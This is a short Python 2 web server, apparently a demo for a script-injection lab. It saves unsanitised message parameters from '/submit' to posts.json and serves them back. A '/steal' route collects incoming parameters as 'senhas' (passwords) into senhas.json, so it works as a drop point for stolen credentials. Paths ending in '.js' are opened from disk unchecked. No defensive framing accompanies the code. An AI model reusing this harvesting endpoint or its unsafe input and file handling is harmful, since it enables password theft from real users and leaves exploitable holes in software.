import json
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from os import curdir, sep
PORT_NUMBER = 8080

def getParams(url, split_with="?", second="="):
  params = url.split(split_with)
  comment = ''
  for param in params:
    i = 0
    for value in param.split(second):
      if i > 0: comment += value
      i+=1

  ret = {}
  ret["message"] = comment
  return ret

class myHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    if ("/submit" in self.path):
      url = "http://localhost:8080" + self.path
      post = getParams(url)
      print(post)

      with open("posts.json", "rt") as f:
        posts = json.loads(f.read())
        posts.append(post)

      with open("posts.json", "w") as f:
        print("Saving new post")
        print(post)
        json.dump(posts, f)

    if (self.path == "/posts.json"):
      self.path = "/posts.json"
      mimetype='application/json'
    elif (self.path.endswith(".js")):
      mimetype='application/javascript'
    elif ('/steal' in self.path):
      url = "http://localhost:8080" + self.path
      senha = getParams(url, split_with="&", second="@")

      with open("senhas.json", "rt") as f:
        senhas = json.loads(f.read())
        senhas.append(senha)

      with open("senhas.json", "w") as f:
        print("Saving new senha")
        print(senha)
        json.dump(senhas, f)
      self.path = "/index.html"
      mimetype='text/html'

    else:
      self.path = "/index.html"
      mimetype='text/html'


    f = open(curdir + sep + self.path)
    self.send_response(200)
    self.send_header('Content-type', mimetype)
    self.end_headers()
    self.wfile.write(f.read())
    f.close()

server = HTTPServer(('', PORT_NUMBER), myHandler)
print 'Started httpserver on port' , PORT_NUMBER
server.serve_forever()
